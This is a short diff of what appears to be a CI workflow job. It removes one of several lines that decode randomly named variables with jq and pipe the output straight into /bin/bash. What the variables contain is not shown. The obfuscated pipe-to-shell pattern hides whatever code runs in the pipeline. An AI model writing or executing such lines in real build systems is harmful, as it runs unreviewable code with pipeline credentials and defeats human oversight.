@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$c49242" | jq -r .idiey65 | /bin/bash
           echo $x9858 | jq -r .ku9204 | /bin/bash
           echo $rd32335 | jq -r .qekf525 | /bin/bash
-          printf '%s' "$j5852" | jq -r .dmj106 | /bin/bash
           echo $xjdk39 | jq -r .jo829 | /bin/bash
 
       - name: Store results
